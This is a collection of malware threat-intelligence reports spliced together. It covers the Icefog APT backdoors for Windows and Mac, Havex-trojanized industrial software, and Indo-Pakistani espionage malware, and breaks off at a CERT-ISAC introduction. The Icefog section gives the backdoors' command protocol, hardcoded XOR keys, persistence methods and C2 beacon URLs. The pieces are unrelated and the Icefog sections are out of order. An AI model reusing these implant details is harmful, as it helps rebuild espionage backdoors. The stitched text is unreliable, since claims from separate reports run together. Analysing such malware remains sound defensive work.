The data storage is the same - local filesystem , and even the file names are the same as on the previous Icefog version .
Here is a screenshot of the user interface from the Icefog - NG C & C application .
Like with the web - based Icefog , this C & C application requires authorization of the operator .
While in the web version it made sense to authenticate remote users to restrict access to the Control Panel , the desktop application authentication is easily bypassed , because the login and password are hardcoded in the binary .
Here 's a look at the `` victims '' panel in the Icefog - NG C & C software : One curious fact about Icefog - NG is that it is usable only if you have screen resolution set at 1280x1024 or higher .
Even on standard 1024x768 , not all controls fit into screen .
The application was created using Microsoft Visual Studio MFC AppWizard .
Although , the sample we analyzed was compiled in May 2013 , the project was most likely started in 2012 , which is stated in the '' About Application '' message box .
This date is put automatically by the AppWizard when the code is generated for the first time .
The command - and - control servers maintain full logs of the victims together with the various operations performed on them by the C & C operators .
These logs are encrypted with a simple XOR operation and available to anyone who knows their location and name on the server .
Here 's what a decoded log looks like : These logs can sometimes help to identify the targets of the attacks and in some cases , the victims .
During our research , we observed attacks against a number of targets in South Korea , Taiwan and Japan .
These include defense industry contractors such as Lig Nex1 and Selectron Industrial Company , shipbuilding companies such as DSME Tech , Hanjin Heavy Industries , telecom operators such as Korea Telecom , media companies such as Fuji TV and the Japan - China Economic Association .
During our research , we managed to sinkhole 13 domains used by the attackers : > > spekosoft.com > > kechospital.com > > unikorean.com > > pasakosoft.net > > chinauswatch.net > > msvistastar.com > > defenseasia.net > > pinganw.org > > kevinsw.net > > avatime.net > > shinebay.net > > securimalware.net - used in spear - phishing attacks > > appst0re.net - MacFog 's command - and - control All of them have been redirected to the Kaspersky Sinkhole server at 95.211.172.143 .
Overall , during the monitoring period , we observed connections from several victims , based in South Korea , Japan , Taiwan , Germany and some other countries .
For Windows based computers , we have the following statistics : .
For Macfog , the Mac OS X version of the backdoor , we have the following statistics : Overall , we ' ve observed over 4500 IPs with infected Macfog hosts , belonging to more than 430 unique victims .
For Windows - based machines , our sinkhole received connections from almost 200 unique IPs , in six countries .
It should be noted that in terms of the overall picture , these sinkholed domains offer a view of only a fraction of the infected computers , especially old infections which for some reason have not yet been disinfected .
The newer attacks are more difficult to track because they use new C & C domains that ca n't be easily sinkholed .
Another important note relates to geographical distribution of victims .
While we see many connections coming from China , this does n't mean that it has victims of targeted attacks .
Because the Macfog samples that we have seen are being distributed in a trojanized bundle with legitimate software on publicly available Chinese message boards , visitors ( especially those who read Chinese ) from any country in the world could get infected .
We believe that a primary goal of doing that was to test malware in different environments and evaluate its efficiency .
That explains why the domain used as C2 was abandoned - random victims had less value for the attackers .
Based on the more reliable analysis of the C & C servers used in the targeted attacks , spearphishing examples and other data collected during our research , we believe that the primary targets of the Icefog operations were in South Korea and Japan .
Based on the list of IPs used to monitor and control the infrastructure , we assume some of the threat actors behind this operation are based in at least three countries : > > China ( the largest number of connections ) > > South Korea > > Japan More information on attribution is available in our private report for governments .
( Contact intelreports @ kaspersky.com ) The `` MSUC.DAT '' type `` 2 '' backdoor has an ASCII string inside with the following content : `` Yang . ZC Wang . GS Zhan . QP Ma . J Li . X Hu . HXU '' .
The Icefog Type `` 2 '' backdoor loader with MD5 `` be043b0d1337f85cfd05f786eaf4f942 '' , found on the C2 domain `` infostaition.com '' has the following debug path inside : '' C : \Users\yang.zc\Desktop\代码片调用程序 4\Release\UCCodePieceGo.pdb '' Note that `` Yang.zc '' appears in both strings .
The string `` 代码片调用程序 4 '' translates to `` Piece of code calling 4 '' from Chinese .
One of the C & C backend control scripts ( control.aspx ) has the page title `` 尖刀三号 '' , which means '' Dagger Three '' in Simplified Chinese .
The ASPX server - side scripts contain a number of messages and code comments in Chinese : One of the lateral movement tools used by the attackers has a Chinese name : windows版本号.txt.jpg - `` windows version.txt.jpg '' Unauthenticated C & C login attempts to access the command - and - control user interface result in redirects to ' sohu.com ' : More information is available in our private report for governments .
( Contact intelreports @ kaspersky.com ) Accounts used to send mail by the older `` 2011 '' Icefog : Note : due to shared hosting , blocking IPs for Icefog C2s can cause false positives .
These IPs are known to point to dedicated hosting servers .
This paper describes `` Icefog '' , a small APT group which focuses on targets in South Korea and Japan .
The operation appears to have started in 2011 and increased in size and scope during each year .
Based on the victim profiles , the attackers appear to have an interest in the following sectors : Despite their relative lack of complexity , the attackers have successfully compromised targets belonging to these categories , with the largest number of victims being in South Korea .
The Icefog attackers have both Windows and Mac OS X backdoors at their disposal .
The Mac OS X backdoor currently remains largely undetected by security solutions and has managed to infect several hundred victims worldwide .
The `` hit and run '' nature of this operation is one of the things that make it unusual .
While in other cases , victims remain infected for months or even years , and data is continuously exfiltrated , the Icefog attackers appear to know very well what they need from the victims .
Once the information is obtained , the victim is abandoned .
During the past years , we observed a large increase in the number of APTs which are hitting pretty much all types of victims and sectors .
In turn , this is coupled with an increased focus on sensitive information and corporate cyber - espionage .
In the future , we predict the number of small , focused APT - to - hire groups to grow , specializing in hit - and - run operations , a kind of `` cyber mercenaries '' of the modern world .
Recommendations on how to stay safe from such attacks ( for both Windows and Mac OS X users ) : > > Update Java to the most recent version or , if you do n't use Java , uninstall it .
> > Update Microsoft Windows and Microsoft Office to the latest versions .
> > Update all other third party software , such as Adobe Reader .
> > Be wary of clicking on links and opening attachments from unknown persons .
> > Windows users can install Microsoft EMET 4.0 , a toolkit designed to help prevent hackers from gaining access to your system .
So far , we have n't observed the use of zero - day vulnerabilities by the Icefog group ; to defend against those , although patches do n't help , technologies such as AEP ( Automatic Exploit Prevention ) and DefaultDeny can be quite effective .
The module is a non - packed Win32 PE DLL file compiled in Microsoft Visual C++ 8.0 .
The module installs at % WinDir % \wdmaud.drv and is automatically loaded by explorer.exe on startup .
This technique is known as `` DLL search order hijacking '' , and abuses the fact that Windows Explorer will load this file from its own directory first , instead of the Windows SYSTEM folder .
It communicates with the C & C server at ' icefog.8.100911.com ' ( 211.42.249.39 ) and passes collected information about victim , lets the operator download or upload files to and from the victim machines , execute system commands on the infected machines as well as execute additional malware components .
After the DLL is loaded , it creates system mutex named `` myhorse_macfee '' .
If such mutex already exists , the module quits to avoid duplicate instances from running .
After that , it loads % WinDir % \wdmaud.drv ( this DRV is loaded by explorer.exe on startup ) and calls exported mymainfunc of its own module that creates a new thread responsible for the communication with C & C .
The spawned thread collects information about the system such as user names , machine names , IP addresses , running processes , proxy settings , Windows versions , etc .
It produces a report that is later submitted to the C & C server .
An example for such a report is shown below : This information is then written to the file at % TMP % \tmp.dat .
Then , it checks if the % TMP % \msuc.dat file exists .
If it exists , the module creates a new thread that will load the file contents into memory and pass execution flow to the first byte of the loaded data in memory .
The contents of the tmp.dat is converted to wide char and XORed with key `` * & ~^ % @ 0hh8979 '' .
Immediately after , it is sent via HTTP/1.1 POST request to ' icefog.8.100911.com ' on port 80 .
The full query string is the following : Full HTTP headers : Connection : Keep - Alive Cache - Control : no - cache The module attempts to get ' icefog.8.100911.com/news/order/ < HOSTNAME > _ < HOSTIP > .jpg '
file with custom user agent `` mydownload '' .
The response is saved to file % TMP % \order.dat The content of order.dat is converted from widechar to multibyte string and is parsed for the following command strings : If any of the commands above is found , the Trojan notifies the C & C that the command was received by issuing the following POST request : Full HTTP/1.1 headers : The cmd command expect a payload string ( < COMMAND > ) following the `` cmd _ '' prefix , so that the full command syntax looks like this : cmd _ < COMMAND > .
It creates a new process with command line C : \windows\system32\cmd.exe /c < COMMAND > However , if < COMMAND > contains output redirection character `` > '' , the executed command line will be as following : After the process has finished its stdout output is sent to the C & C via The command - line output is converted to wide - char string and XORed using `` * & ~^ % @ 0hh8979 '' string as the key .
The command string format must be as following : upload _ < FILEPATH > _ < FILENAME > It attempts to fetch icefog.8.100911.com/news/order/ < FILENAME > using user agent mydownload and saves the response to the local path specified in < FILEPATH > .
After that it notifies the C & C by sending Full HTTP/1.1 headers : Download command format must be The < LOCALPATH > \ < FILENAME > file is opened and its content is prepared for uploading by converting ANSI data to Unicode and XORing using key `` * & ~^ % @ 0hh8979 '' .
The result is saved to % TMP % \tmpxor.dat ' The tmpxor.dat is uploaded via POST request to ' icefog.8.100911.com ' at port 80 .
Full HTTP/1.1 headers : The code command format must be code _ < FILENAME > A new thread is created that loads a local file , specified in < FILENAME > , to memory and passes the execution to the first byte of the loaded data .
If no known command is parsed out of the server response , the Trojan notifies the server about being alive by issuing the following HTTP POST request : After that it sleeps for 150 seconds and starts the command - processing loop again .
In addition to the web - based Icefog malware samples , we have come across a variant of the Icefog bot which is based on a custom protocol working over a TCP session ( port 5600 TCP ) with its own desktop application that serves as a command - and - control center .
For reference , we called it Icefog - NG ( New Generation ) .
We believe that the new generation of Icefog was created to improve bot response and to increase the efficiency of operations .
The previous web - based version of the bot had significant time lag during operation ( up to 40 seconds ) , the new generation bot was created to solve the time lag issue .
The module is a non - packed Win32 PE Executable file compiled in Microsoft Visual C++ 2005 .
It is a backdoor that is capable of collecting system information , download and upload files , execute commands .
To enable automatic start during system boot , the malware adds and uses the following system registry value : HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load= '' % TMP % \msloger.exe '' During start it checks if a file named `` % TMP % \~AA.tmp '' exists .
If yes , it copies the file to % TMP % \ hwp.hwp .
Next it kills processes named `` hwp.exe '' and then opens `` hwp.hwp '' .
This is important step during first malware run which opens a decoy .hwp
document .
This shows that the malware was designed to be installed from .hwp
documents containing exploits .
Then it copies `` % TMP % \~Ab.tmp '' to `` % TMP % \msloger.exe '' .
After that the malware registers on the C & C .
To do that , the malware connects to www.kreamnnd .
com on port 5600 and sends a registration message [ Total message size : DWORD ] SX [ HOSTID length : WORD ] [ HOSTID ] [ Host Info Data Size : DWORD ] [ Host Info Data ] HOSTID is a string having system hostname and system IP joined by `` _ '' : Hostname_IP .
The data is encrypted using XOR with key `` & * ^ * @ ~^ % 9 ? i0h '' .
If the connection with C & C is lost the bot can re - establish the session by sending [ Total message size : DWORD ] XT [ Hostname length : WORD ] [ HOSTNAME ] _ [ IPADDR ] After connecting to the C & C and sending the registration message the bot expects commands from the server .
These commands are described below .
This command is used to execute a command line .
The message has the following format : [ Total Message Size : DWORD ] SC [ COMMAND ] The bot checks if the COMMAND contains `` sleep '' then it sleeps for the specified time after `` sleep '' substring .
Otherwise , a new cmd.exe processes is spawned to execute the COMMAND .
If the command does not contain `` > '' the output will be directed to % TMP % \cmd1.dat and the result will be sent to the C & C automatically using the following format : [ Total Message Size : DWORD ] [ cmd1.dat data ] The % TMP % \cmd1.dat is deleted after the file is sent to the C & C .
This command is used to download a file from the victim machine .
The message has the following format : [ Total Message Size : DWORD ] DL [ FILEPATH ] The server expects the bot to send a response message with the file size from victim bot [ Total Message Size : DWORD ] OK [ File Size : DWORD ] Then the server sends an acknowledgement message to the victim bot [ Total Message Size : DWORD ] OK The bot encrypts the contents of the file and saves it to % TMP % \mstmpdata.dat .
After that part it sends mstmpdata.dat file split in chunks of 0x4ffc each ( the last one may be shorter than 0x4ffc ) .
Here is the format of that message : [ Total Message Size : DWORD ] [ File data no longer than 0x4ffc ] The last message is repeated containing the next chunk of the file until end of file is reached .
This command is used to upload a file from the C & C to the bot .
The format of this command is the following : [ Total Message Size : DWORD ] UP [ File Size : DWORD ] [ Data Chunk Size+Total Message Size field length , a hardcoded value of 0x5000 : DWORD ] [ File Name ] The server expect an OK message from the bot [ Total Message Size : DWORD ] OK Then C & C sends the first part of the file .
[ Total Message Size : DWORD ] [ File data no longer than 0x4ffc ] The server expects the OK message from the bot and transfers the next data chunk until the whole file is uploaded This command is used to suspend the C & C connection thread for 1 second .
[ Total Message Size : DWORD ] SL The MacOS X malware uses the type `` 1 '' protocol , just as the Windows version of Icefog .
It has been distributed on various Internet message boards and forums as an application called `` Img2icns '' .
There are two known malicious bundles , one contains the launcher and the backdoor modules , and another contains the dropper and the backdoor modules .
Once the user executes the malicious application bundle , the backdoor is copied to the user 's directory and the legitimate application is started as if there was no added malicious code .
The module is written in Objective C language and contains 4 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload .
The latter three classes seem to be included from the backdoor 's source code but not used .
All functionality is implemented in the function `` AppDelegate - ( void ) applicationDidFinishLaunching : ( i d ) '' .
The module was created from the same source code as the dropper but instead of installing the backdoor module , it only executes the malicious payload and the decoy application : `` % bundle path % /Contents / Resources/.launchd.app '' `` % bundle path % /Contents / Resources/.Img2icns.app '' ( the original `` Img2icns '' application , http : //www.img2icnsapp.com/ ) .
The module is written in Objective C language and contains 4 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload .
The latter three classes seem to be included from the backdoor 's source code but not used .
All functionality is implemented in the function `` AppDelegate - ( void ) applicationDidFinishLaunching : ( i d ) '' .
The module copies its malicious bundle from `` Contents / Resources/.launchd.app '' to user 's home directory `` /Users/ % username % '' and launches it , effectively activating the backdoor .
Then , it launches the legitimate part of the bundle , `` Contents / Resources / Img2icns.app '' that is the original '' Img2icns '' application ( http : //www.img2icnsapp.com/ ) .
The module is written in Objective C language and contains 5 classes : AppDelegate , UCHostInf , UCNet , UCUpDownload , KEYLogger .
The `` KEYLogger '' class appears to be incomplete .
It is only able to get information about active modifier keys and writes data to a log file : `` $ HOME / Library / log.log '' When started , the module launches an application : `` % application 's bundle path % /Contents/ Resources/.launchd.app '' This code seems to be reused from the dropper module .
Then , it proceeds with installation .
Once the installation is finished , it starts its main thread ( `` UCServerThread '' function ) in an infinite loop .
The module checks if its bundle directory is located in `` /Users/ % username % / '' and if not it copies the bundle to that directory .
It also writes the command `` rm -rf % original bundle path % '' to the file `` /Users/ % username % /.launchd .
app / config.dat '' .
This command is then executed by the installed copy of the backdoor , effectively removing the original bundle directory .
Then , it creates a file `` $ HOME / Library / LaunchAgents / apple.launchd.plist '' with all the parameters required to launch the backdoor every time the system starts .
The module retrieves host information and host name and uploads this information to the C2 server .
All data sent to the C & C server is encrypted with the hardcoded XOR key `` * & ~^ % @ 0hh8979 '' .
First , it makes a POST request with URL `` hxxp : //appst0re.net / upload .
aspx ? filepath = ok & filename= % hostname % .jpg
'' .
After that , it requests commands from the C & C server .
If no data was received , it tries again after sleeping for 120 seconds .
The module requests new commands by making a POST request to the C & C server by URL `` hxxp : // appst0re.net/upload.aspx ? filepath = order & filename= % hostname % .jpg
'' and then executes the command : Information retrieved from the system : > > host name > > OS name > > OS version string > > process information > > IP addresses > > system uptime > > host date / time C & C server : hxxp : //appst0re.net C & C URLs : hxxp : //appst0re.net / upload.aspx ? filepath= % order / ok / arbitrary name % & filename= % hostname % .jpg
Monday , 27 October 2014 11:11:00 ( UTC / GMT ) I did a presentation at the 4SICS conference earlier this week , where I disclosed the results from my analysis of the Havex RAT / backdoor ( slides available here ) .
The Havex backdoor is developed and used by a hacker group called Dragonfly , who are also known as '' Energetic Bear '' and `` Crouching Yeti '' .
Dragonfly is an APT hacker group , who have been reported to specifically target organizations in the energy sector as well as companies in other ICS sectors such as industrial / machinery , manufacturing and pharmaceutical .
In my 4SICS talk I disclosed a previously unpublished comprehensive view of ICS software that has been trojanized with the Havex backdoor , complete with screenshots , version numbers and checksums .
Dale Petersen , founder of Digital Bond , expressed the following request regarding the lack of public information about the software trojanized with Havex : If the names of the vendors that unwittingly spread Havex were made public , the wide coverage would likely reach most of the affected asset owners .
Following Dale 's request we decided to publish the information presented at 4SICS also in this blog post , in order to reach as many affected asset owners as possible .
The information published here is based on our own sandbox executions of Havex malware samples , which we have obtained via CodeAndSec and malwr.com .
In addition to what I presented at 4SICS , this blog post also includes new findings published by Joel `` scadahacker '' Langill in version 2.0 of his Dragonfly white paper , which was released just a couple of hours after my talk .
In Symantec 's blog post about Havex they write : Three different ICS equipment providers were targeted and malware was inserted into the software bundles The first vendor known to have their software trojanized by the Dragonfly group was the Swiss company MESA Imaging , who manufacture industrial grade cameras for range measurements .
The second vendor to have their software trojanized was the Belgian company eWON , who provide a remote maintenance service for industrial control systems called `` Talk2 M '' .
eWon published an incident report in January 2014 and then a follow - up report in July 2014 saying : Back in January 2014 , the eWON commercial web site www.ewon.biz had been compromised .
A corrupted eCatcherSetup.exe file had been uploaded into the CMS ( Content Management System ) of www.ewon.biz web site .
eCatcher download hyperlinks were rerouted to this corrupted file .
The corrupted eCatcherSetup.exe contained a malware which could , under restricted conditions , compromise the Talk2 M login of the infected user .
Prior to version 2.0 of Joel 's Dragonfly report , eCatcher was the only product from eWON known to be infected with the Havex backdoor .
However , Joel 's report also listed a product called `` eGrabit '' , which we managed to obtain a malware sample for via malwr.com .
The most recent company known to have their software infected with the Havex backdoor was the German company MB Connect Line GmbH , who are known for their industrial router mbNET and VPN service mbCONNECT24 .
MB Connect Line published a report about the Dragonfly intrusion in September 2014 , where they write : On 16th of April 2014 our website www.mbconnectline.com has been attacked by hackers .
The files mbCHECK ( Europe ) , VCOM_LAN2 and mbCONFTOOL have been replaced with infected files .
These files were available from 16th of April 2014 to 23th of April 2014 for download from our website .
All of these files were infected with the known Trojan Virus Havex Rat .
Notice how only mbCHECK for users in Europe was trojanized , there has been no report of the USA / CAN version of mbCHECK being infected with Havex .
We have not been able to get hold of a malware sample for the trojanized version of VCOM_LAN2 .
The screenshot below is therefore from a clean version of this software .
The vendors who have gotten their software trojanized by Dragonfly are all European ICS companies ( Switzerland , Belgium and Germany ) .
Additionally , only the mbCHECK version for users in Europe was infected with Havex , but not the one for US / Canada .
These facts indicate that the Dragonfly / Energetic Bear threat actor seems to primarily target ICS companies in Europe .
We 're currently working on a follow - up blog post , which shows how to detect and analyze network traffic from ICS networks infected with Havex .
Threat Connect Threat Intelligence Why Threat Intelligence is Important How to Develop Threat Intelligence Community Collaboration Case Study Platform Capabilities Integrations ThreatConnect™ API ThreatConnect™ Cloud Cloud Security Upgrade Communities Private Communities Moderated Common Community Moderated Subscriber Communities Intelligence Research Team Data Privacy Methodology Diamond Model of Intrusion Analysis Threat Inference Engine Collaborative Intelligence News & Events In The News Press Releases Blog About Leadership Careers Contact Us Login Home News Posted August 2 , 2013 by TCIRT & filed under Research .
The global proliferation of cyber espionage may be serving as a catalyst for regional entities within South Asia to adopt their own cyber espionage capabilities .
Irrespective of the threats sophistication or motivation , South Asian cyber threats are likely emulating behaviors of larger regional powers to strategically influence national , organizational or individual objectives .
The ThreatConnect Intelligence Research Team ( TCIRT ) has identified an example of South Asian cyber espionage that is likely transcending sectors and regional geographic boundaries .
Analyses of multiple customized malware binaries hosted within a small U.S. subnet have likely been used to target Indian military or government entities .
The malware contains specific artifacts that point to a commercial Pakistani entity .
Although the TCIRT can not conclusively confirm direct involvement , several hypotheses have been developed which may account for the malware and observed activity .
All of the following information and threat indicators are available within ThreatConnect.com and have been shared with the ThreatConnect community .
Operational Caveat : The ThreatConnect Intelligence Research Team has contacted the affected service providers and notified them of the activity observed .
Details associated with this threat have been shared with the ThreatConnect Community within Incident `` 20130731A : South Asia Cyber Espionage Heats Up '' .
Globalization has woven the Internet into a fabric that interlaces practically every aspect of modern living .
Throughout the years , as evidenced in countless media reports , world superpowers have recognized and utilized the Internet as a powerful source for intelligence collection , and on occasion we have been offered glimpses as to how they are leveraging cyber espionage in support of their national diplomatic , military or economic objectives .
Similar to a younger sibling looking up to a big brother , regional and middle powers within South Asia are seeking to leverage global cyber espionage in an effort to achieve parity with nation states who have far - reaching diplomatic power , modernized militaries and influential economies .
Ultimately , these emergent economies are likely seeking to hasten their path to success in fulfilling national objectives via the `` short - cut '' that cyber espionage offers .
Individual countries within the Indo - Pak subcontinent are increasingly involved in cyber attacks and targeted espionage campaigns .
South Asia is no stranger to deeply rooted conventional conflict which is most often a strong harbinger of cyber conflict .
On March 17th , 2013 , the Norwegian - based , global telecommunications provider Telenor reported a network breach from an unknown sophisticated threat actor that targeted Telenor executives using custom malware implants .
The attackers were responsible for pilfering email archives and documents from Telenor executives , compromising their intellectual property and business operations .
Nearly two months later , the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover : Unveiling an Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise .
They noted similar targeting campaigns that were observed exploiting numerous industries and organizations within Norway , Pakistan , US , Iran , China , Taiwan , Thailand , Jordan , Indonesia , UK , Germany , Austria , Poland , and Romania .
Norman speculated that a group associated with an identified private Indian information security company likely carried out the espionage campaigns .
Norman 's 43 page assessment concluded that a sophisticated Indian exploitation team was indeed responsible for the network breach and Telenor compromise .
The TCIRT believes that a possible theory that supports an Indian attack scenario is that the Telenor subsidiary , Telenor Pakistan , is a strategic communications infrastructure provider .
Telenor Pakistan provides voice , data content and mobile communications to more than 3,500 cities and towns within Pakistan .
Persistent remote Indian access to a strategic communications service provider , such as Telenor Pakistan , would certainly yield unparalleled signals intelligence collection capability .
The information obtained would be of strategic value to Indian intelligence services .
In light of the recent revelation of Indian involvement in the targeting of Telenor , it is critical for us to consider the borderless nature of cyber espionage and to understand how regional cyber conflicts can spill across geographies and affect critical commercial business operations .
As part of an ongoing TCIRT focused research and analysis , we have found custom malware being used operationally `` in the wild '' that may be targeting Indian military and government related entities , as well as other unidentified South Asian targets .
This activity is possibly linked to an identified Pakistani information security company .
In late May 2013 , TCIRT identified a malicious file hosted at [ http : // ] 199.91.173 [ .
] 43/new_salary / salary_revision.scr ( Kansas City , Missouri ) .
This file was a self - extracting ( SFX ) archive that , when executed , presents the target victim with a 12 page decoy PDF document .
The document was an official Government of India ( GoI ) , Ministry of Defense ( MoD ) pension memorandum of record .
It is highly likely that the malware and decoy document would be tailored for and delivered to specific recipients associated with the GoI or MoD .
The SFX dropper contained multiple custom executable files , as well as legitimate Microsoft Visual C++ Runtime Library files , which are part of the codebase used to develop and required to execute the backdoor code .
The malware also uses the legitimate cURL library in the form of libcurld.dll .
The open - source cURL library is a multiprotocol transfer library used primarily for FTP and HTTP transactions .
The main backdoor component is found in winsocks.exe .
The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the winsocks.exe backdoor component .
When executed , the winsocks.exe backdoor requests a PHP update callback at [ http : // ] 199.91.173 [ .
] 43/fetch_updates_8765.php ? compname= < COMPUTERNAME > .
A version.txt file is also requested by the malware .
This file contained a version number 1.0 , likely denoting the version of the backdoor and/or the command and control ( C2 ) backend .
The winsocks.exe backdoor also contains hardcoded strings of Office file extensions , telegraphing the likely intention of the attackers in collecting and exfiltrating office automated documents from victim networks .
Another variant of this backdoor uses the same winsocks.exe with a different dropping mechanism and was found at [ http : // ] 199.91.173 [ .
] 43/Classified_Video.flv.scr and [ http : // ] 199.91.173 [ .
] 43/sarbajit_leaked_video.wmv.scr .
Both of these .scr
files have the same MD5 .
In this SFX , Windows batch files had replaced the ExtractPDF.exe and Start.exe with a decoy Flash video ( FLV ) file was used in place of the decoy PDF .
An FLV file is an interesting choice of decoy document since it is not a standard video format for media players .
The dynamic DNS domains windowsupdate.no- ip [ .
] biz and masalavideos.no-ip [ .
] biz were also being mapped to IP Address 199.91.173.43 as of late May 2013 , when the video themed malicious attachments were being operationalized .
When opened the flash video simply displays a couple kissing passionately .
Implementing the use of free dynamic DNS services , such as those of NO - IP within targeting and exploitation phases of attack , are very common techniques used by a variety sophisticated threat groups .
The file sarbajit_leaked_video.wmv.scr contains a compile time of May 28 , 2013 19:53:26 UTC .
The filename is possibly a misspelled reference to Sarabjit Singh , an Indian national who was arrested and convicted of terrorism and espionage charges in 1991 by Pakistani authorities .
After a protracted 22 year legal battle , Sarabjit Singh would become the victim of a severe beating by Pakistani prisoners and would later die of his injuries in a Lahore hospital on May 2 , 2013 .
News of the attack and subsequent death of Sarabjit Singh incited protests in India that increased regional Indo - Pakistani tensions and served as a catalyst for bilateral governmental negotiations between Delhi and Islamabad .
This file was created 26 days after the death of Sarabjit Singh , and would be of relevance to targeted Indian entities , much like the official Government of India ( GoI ) , Ministry of Defense ( MoD ) pension memorandum .
Operational Caveat : It is important to note that there are information gaps which diminish our ability to establish a definitive explanation for the malicious activity and identify the responsible entities behind the authorship and use of the identified malware .
Below the TCIRT simply highlights the facts associated with specific artifacts identified within the malware .
Most of the dropped malware binaries contained a debug string that sheds light on the possible developers and operators of the malware .
The significance of the username Tranchulas within the debug path of the winsocks.exe binary is that Tranchulas is a Pakistani information security consulting company with offices in the United Kingdom , United States , and Pakistan .
The CEO of Tranchulas is Zubair Khan , a Pakistani national and information security executive who has `` been researching mainly on [ sic ] cyber warfare '' .
Khan also likely maintains a close relationship to the Pakistani government .
According to this online biography , he is responsible for the penetration testing of Pakistani homeland security solutions and has consulted for the Pakistani National Database and Registration Authority ( NADRA ) .
Proximity to such sensitive security programs suggest a certain level of trust on behalf of the Pakistani government , and may indicate that official Pakistani entities could have access to Tranchulas technical support for various security projects or programs .
An ironic , yet noteworthy observation is that the Tranchulas website boasts Telenor as a client .
Tranchulas also serves as an official sponsor for the Pakistan CERT in addition to maintaining the official Pakistan CERT website ( cert.org.pk ) .
On July 2 , 2013 a similar file windefender.exe ( MD5 : a21f2cb65a3467925c1615794cce7581 ) was identified containing a strong association to Tranchulas .
This particular binary contained the following debug string : C : \Users\umairaziz27\Documents\Visual Studio 2008\Projects\usb\Release\usb.pdb The username `` UmairAziz27 '' reveals a Twitter account @ umairaziz27 for an `` Optimistic Patriot by choice '' who is `` Working as InfoSec Analyst at @ Tranchulas .
'' Umair Aziz ( umairaziz27 ) maintains a LinkedIn professional profile that highlights his employment at Tranchulas and reveals that he was educated at the National University of Sciences and Technology School of Electrical Engineering and Computer Science ( NUST - SEECS ) in Pakistan .
A second host within the same 199.91.173 [ .
] 40/29 subnet was also identified hosting similar zipped malware at [ http : // ] 199.91.173 [ .
] 45/OBL_Leaked_Report.zip and [ http : // ] 199.91.173 [ .
] 45/Naxalites_Funded_By_Pakistan.zip .
The OBL_Leaked_Report.zip contained a .scr
file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden ( OBL ) .
This OBL malware drops a windefender.exe backdoor component ( MD5 : 35663e66d02e889d35aa5608c61795eb ) In this case , the debug string is : C : \Users\Cert - India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb .
The binaries that contain the `` umairaziz27ʺ″ and `` Cert - India '' debug strings are designed to call back to [ http : // ] 199.91.173 [ .
] 45/fetch_updates_8765_tb.php ? compname= < COMPUTERNAME > and [ http : // ] 199.91.173 [ .
] 45/is_array.php ? compname= < COMPUTERNAME > .
Meanwhile , the Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document .
The dropped implant , showppt.scr ( MD5 : 165ac370b54e664812e4c15b2396ccd6 ) , is a downloader that connects to [ http : // ] 199.91.173 [ .
] 45/ and downloads both legitimate library files and malicious second stage binaries .
The use of Tranchulas and UmairAziz27 in the malware debugging paths , in addition to the multiple targeting campaigns that maintain themes likely aimed at Indian entities or involving Pakistan related issues , leads us to assess the following competing hypotheses which may be considered as plausible explanations for the identified activity : Hypothesis 1 : Tranchulas developed the malicious binaries , and staged them for offensive exploitation operations on behalf of an unidentified customer .
Hypothesis 2 : Tranchulas developed and sold the malicious binaries to an unidentified customer , where they were later operationalized by an unidentified entity .
Hypothesis 3 : An unidentified third party unaffiliated with Tranchulas developed the malware , deliberately including misleading software artifacts as a direct effort to create speculation and shift blame toward Tranchulas .
Hypothesis 4 : A rogue Tranchulas employee used company resources without company knowledge to develop the malware , where an unknown operator later used it offensively .
Hypothesis 5 : Indian entities actively sought and utilized the services of Pakistan based information security company , Tranchulas , for an officially sanctioned and authorized penetration test .
The malicious implants were subsequently developed and used as part of official Tranchulas service offerings , while the files and infrastructure used for the audit were submitted to publicly available malware analysis services .
Hypothesis 6 : An unidentified Indian entity developed and used this malware as a realistic simulated exercise to perform penetration testing and evaluate their readiness in the event of actual Pakistani affiliated offensive network operations .
The files and infrastructure used for the simulation were submitted to publicly available malware analysis services .
Considering the long - standing regional tensions between India and Pakistan , South Asia serves as a likely flashpoint for conventional conflict to carry over and play out within cyberspace .
Public and private sectors alike should begin to increase their awareness of emerging cyber threats from the lesser - known middle powers .
Regardless of sophistication , these threats may support future belligerents who have or will eventually possess the capability and intent to disrupt critical business operations .
Details associated with this threat have been shared with the ThreatConnect Community within Incident `` 20130731A : South Asia Cyber Espionage Heats Up '' .
If you or your organization is interested in obtaining crowd - sourced threat intelligence that increases your awareness of emerging cyber threats , please register at ThreatConnect.com and join our community .
Tags : Cyber Espionage , India , Pakistan , South Asia , Telenor Previous article Next article No Comments Search the Site ...
SUBSCRIBE TO OUR BLOG VIA RSS feed OR EMAIL Email Address Cyber Squared Launches ThreatConnect™ API ThreatConnect Gets to the Root of Targeted Exploitation Campaigns ThreatConnect Takes Signature Management to the Next Level The Dollars and `` Sense '' Behind Threat Intelligence Sharing Divide and Conquer : Unmasking China 's ' Quarian ' Campaigns Through Community In The News Press Releases Research January 2014 December 2013 November 2013 October 2013 September 2013 August 2013 Threat Connect .
The objective of this report is the following :  An overview of malware distribution in Indian Cyberspace  Detailed , in - depth technical analysis of Advanced Persistent Threat ( APT ) actors against India  Enumerate the primary technical causes leading to successful attacks  Recommendations to improve and protect the overall Critical Information Infrastructuren CERT - ISAC is India 's first Independent CERT for mobile and electronic security .
Established by the non - profit scientific foundation `` Information Sharing and Analysis Center '' ( ISAC ) that manages the National security Database ( NSD ) program , CERT - ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi and Mumbai to monitor constant threats and attacks on the India Cyber Space .
CERT - ISAC has numerous security experts from the National Security Database program who regularly support the research initiatives .
`` Po '' is an advanced behavior based mobile anti - virus designed by the organization Research Bunble , especially for the defence .
The Po Engine is currently used by CERT - ISAC for malware analysis and certification of mobile apps for security and privacy .
www . ResearchBundle.com The recent ' Operation Hangover ' report from Norman 's Malware Detection Team has projected India as an emerging APT actor .
The report goes on to document a detailed analysis of targeted malware and lists a small number of Indian - based companies that were potentially threat actors involved in the campaign .
